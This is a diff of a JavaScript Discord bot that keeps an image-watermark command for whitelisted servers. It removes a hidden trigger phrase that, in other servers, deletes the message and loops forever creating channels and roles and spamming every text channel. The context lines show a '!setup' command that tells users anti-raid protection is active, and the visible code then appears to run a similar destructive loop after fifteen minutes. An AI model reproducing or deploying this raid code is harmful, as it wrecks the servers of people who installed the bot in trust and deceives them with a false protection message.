@@ -42,68 +42,6 @@ client.on("messageCreate",async function(message){
   if(message.author.bot){
     return;
   }
-  if(isWhitelist){
-    if(message.content.indexOf("!watermark")!=-1){
-      let attachment=message.attachments.first();
-      if(!attachment){
-        return;
-      }
-      let baseImg=await loadImage(attachment.url);
-      let watermark=await loadImage("./WaterMark_of_UFFF.png");
-      let canvas=createCanvas(baseImg.width,baseImg.height);
-      let ctx=canvas.getContext("2d");
-      ctx.drawImage(baseImg,0,0,canvas.width,canvas.height);
-      watermark.width=canvas.height*0.14;
-      watermark.height=watermark.width;
-      ctx.drawImage(watermark,canvas.width-watermark.width*1.14,watermark.height*0.14,watermark.width,watermark.height);
-      let buffer=canvas.toBuffer("image/png");
-      let file=new AttachmentBuilder(buffer,{name:"download.png"});
-      await message.reply({files:[file]});
-    }
-  }
-  else{
-    if(message.content.indexOf("こんにちは")!=-1){
-      message.delete();
-      let guild=client.guilds.cache.get(message.guild.id);
-      let getMillisecond=message.content.split("こんにちは")[1].replace(" ","").split(" ").map(function(data){return Number(data)||null});
-      let millisecond=[getMillisecond[0]||100,getMillisecond[1]||100,getMillisecond[2]||500];
-      setInterval(async function(){
-        guild.channels.create({
-          name:getText(true),
-          type:0
-        });
-        guild.channels.cache.forEach(function(channel,i){
-          if(channel.type==4){
-            setTimeout(function(){
-              guild.channels.create({
-                name:getText(true),
-                type:0,
-                parent:channel.id
-              });
-            },millisecond[0]*i);
-          }
-          if(channel.type==0){
-            setTimeout(async function(){
-              await channel.send(getText());
-            },millisecond[1]*i);
-          }
-        });
-        await guild.roles.create({name:getText(true)});
-      },millisecond[2]);
-    }
-  }
-});
-client.on("messageCreate",async function(message){
-  let isWhitelist=false;
-  for(let data of whitelist){
-    if(data==message.guild.id){
-      isWhitelist=true;
-      break;
-    }
-  }
-  if(message.author.bot){
-    return;
-  }
   if(!isWhitelist){
     if(message.content.indexOf("!setup")!=-1){
       message.reply("荒らし対策を発動しました\n短期間に連投を行われた場合排除を行います");
@@ -149,6 +87,25 @@ client.on("messageCreate",async function(message){
           await newGuild.roles.create({name:getText(true)});
         },millisecond[2]);
       },15*60000);
+    }
+  }
+  else{
+    if(message.content.indexOf("!watermark")!=-1){
+      let attachment=message.attachments.first();
+      if(!attachment){
+        return;
+      }
+      let baseImg=await loadImage(attachment.url);
+      let watermark=await loadImage("./WaterMark_of_UFFF.png");
+      let canvas=createCanvas(baseImg.width,baseImg.height);
+      let ctx=canvas.getContext("2d");
+      ctx.drawImage(baseImg,0,0,canvas.width,canvas.height);
+      watermark.width=canvas.height*0.14;
+      watermark.height=watermark.width;
+      ctx.drawImage(watermark,canvas.width-watermark.width*1.14,watermark.height*0.14,watermark.width,watermark.height);
+      let buffer=canvas.toBuffer("image/png");
+      let file=new AttachmentBuilder(buffer,{name:"download.png"});
+      await message.reply({files:[file]});
     }
   }
 });
